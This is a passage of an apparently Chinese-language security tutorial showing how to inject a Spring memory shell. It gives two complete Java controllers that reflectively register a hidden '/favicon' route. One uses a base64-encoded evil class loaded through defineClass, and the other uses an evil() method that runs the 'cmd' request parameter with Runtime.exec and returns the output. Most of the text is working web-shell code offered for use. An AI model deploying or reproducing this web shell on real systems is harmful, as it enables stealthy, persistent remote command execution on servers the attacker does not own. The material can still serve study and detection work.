import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * Created by dotast on 2022/11/25 16:37
 */
@Controller
public class HelloController {

    @ResponseBody
    @RequestMapping("/hello")
    public String SayHello(HttpServletRequest req, HttpServletResponse resp){
        String path = "/favicon";
        try{
            // 加载类字节码
            String classCode = "yv66vgAAADQAbQoAFAA6CAAmCwA7ADwKAD0APgoAPQA/CgBAAEEHAEIKAAcAOgoAQwBECgAHAEULAEYARwcASAoABwBJCgAMAEoKAEsATAsARgBNBwBOCgARAE8HAFAHAFEBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEALExjb20vbWVtb3J5c2hlbGwvc3ByaW5nL0NvbnRyb2xsZXJFdmlsQ2xhc3M7AQAFc2hlbGwBAFIoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOylWAQALaW5wdXRTdHJlYW0BABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANiYW8BAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAFYnl0ZXMBAAJbQgEAAWEBAAFJAQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAA1TdGFja01hcFRhYmxlBwBQBwBSBwBTBwBIBwBUBwBCBwAjBwBOAQAKRXhjZXB0aW9ucwEAClNvdXJjZUZpbGUBABhDb250cm9sbGVyRXZpbENsYXNzLmphdmEMABUAFgcAUgwAVQBWBwBXDABYAFkMAFoAWwcAXAwAXQBeAQAdamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW0HAFQMAF8AYAwAYQBiBwBTDABjAGQBABBqYXZhL2xhbmcvU3RyaW5nDABlAGYMABUAZwcAaAwAYQBpDABqAGsBABNqYXZhL2xhbmcvRXhjZXB0aW9uDABsABYBACpjb20vbWVtb3J5c2hlbGwvc3ByaW5nL0NvbnRyb2xsZXJFdmlsQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQATamF2YS9pby9JbnB1dFN0cmVhbQEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABHJlYWQBAAUoW0IpSQEABXdyaXRlAQAHKFtCSUkpVgEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQALdG9CeXRlQXJyYXkBAAQoKVtCAQAFKFtCKVYBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJc2VuZEVycm9yAQAEKEkpVgEAD3ByaW50U3RhY2tUcmFjZQAhABMAFAAAAAAAAgABABUAFgABABcAAAAvAAEAAQAAAAUqtwABsQAAAAIAGAAAAAYAAQAAAAsAGQAAAAwAAQAAAAUAGgAbAAAAAQAcAB0AAgAXAAABbAAEAAgAAABxKxICuQADAgBOLcYAVbgABC22AAW2AAY6BLsAB1m3AAg6BREEALwIOgYCNgcZBBkGtgAJWTYHAp8AEBkFGQYDFQe2AAqn/+gsuQALAQC7AAxZGQW2AA23AA62AA+nAAwsEQGUuQAQAgCnAAhOLbYAErEAAQAAAGgAawARAAMAGAAAAD4ADwAAAA8ACQAQAA0AEQAZABIAIgATACkAFAAsABUAOgAWAEcAGABcABkAXwAaAGgAHgBrABwAbAAdAHAAHwAZAAAAXAAJABkAQwAeAB8ABAAiADoAIAAhAAUAKQAzACIAIwAGACwAMAAkACUABwAJAF8AJgAnAAMAbAAEACgAKQADAAAAcQAaABsAAAAAAHEAKgArAAEAAABxACwALQACAC4AAAA7AAb/ACwACAcALwcAMAcAMQcAMgcAMwcANAcANQEAABr/ABcABAcALwcAMAcAMQcAMgAA+gAIQgcANgQANwAAAAQAAQARAAEAOAAAAAIAOQ==";
            byte[] bytes = sun.misc.BASE64Decoder.class.newInstance().decodeBuffer(classCode);
            java.lang.reflect.Method classMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            classMethod.setAccessible(true);
            Class myClass =  (Class)classMethod.invoke(Thread.currentThread().getContextClassLoader(),  bytes, 0, bytes.length);
            // 获取上下文环境
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 通过 context 获取 RequestMappingHandlerMapping 对象
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 获取父类的 MappingRegistry 属性
            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mappingHandlerMapping);
            //路径映射绑定
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            // springboot 2.6.x之后的版本需要pathPatternsCondition
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).options(config).build();

            // 反射调用 MappingRegistry 的 register 方法
            Class c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            Method[] methods = c.getDeclaredMethods();
            for (Method method:methods){
                if("register".equals(method.getName())){
                    // 反射调用 MappingRegistry 的 register 方法注册
                    method.setAccessible(true);
                    method.invoke(mappingRegistry,requestMappingInfo,myClass.newInstance(),myClass.getMethods()[0]);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return "Hello!";
    }
}
```

访问`/hello`路由注入内存马  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782380744662-deea2392-4d7b-489a-8149-6bc8486cd8ec.png)

访问`/favicon`  
![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782380744786-84394943-9672-469e-a904-c427303af748.png)

不喜欢反射调用的话可以直接写一块

```java
package com.study.springdemo.Controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

/**
 * Created by dotast on 2022/11/25 16:37
 */
@Controller
public class HelloController {

    @ResponseBody
    @RequestMapping("/hello")
    public String SayHello(HttpServletRequest req, HttpServletResponse resp){
        String path = "/favicon";
        try{
            // 加载类
            HelloController helloController = new HelloController();
            Method evilMethod = HelloController.class.getMethod("evil", HttpServletRequest.class, HttpServletResponse.class);
            // 获取上下文环境
            WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
            // 通过 context 获取 RequestMappingHandlerMapping 对象
            RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);
            // 获取父类的 MappingRegistry 属性
            Field f = mappingHandlerMapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mappingHandlerMapping);
            //路径映射绑定
            Field configField = mappingHandlerMapping.getClass().getDeclaredField("config");
            configField.setAccessible(true);
            // springboot 2.6.x之后的版本需要pathPatternsCondition
            RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping);
            RequestMappingInfo requestMappingInfo = RequestMappingInfo.paths(path).options(config).build();

            // 反射调用 MappingRegistry 的 register 方法
            Class c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            Method[] methods = c.getDeclaredMethods();
            for (Method method:methods){
                if("register".equals(method.getName())){
                    // 反射调用 MappingRegistry 的 register 方法注册
                    method.setAccessible(true);
                    method.invoke(mappingRegistry,requestMappingInfo,helloController,evilMethod);
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }

        return "Hello!";
    }

    public void evil(HttpServletRequest request, HttpServletResponse response) throws Exception{
        try{
            String cmd = request.getParameter("cmd");
            if(cmd != null){
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                ByteArrayOutputStream bao = new ByteArrayOutputStream();
                byte[] bytes = new byte[1024];
                int a = -1;
                while((a = inputStream.read(bytes))!=-1){
                    bao.write(bytes,0,a);
                }
                response.getWriter().write(new String(bao.toByteArray()));
            }else {
                response.sendError(404);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
```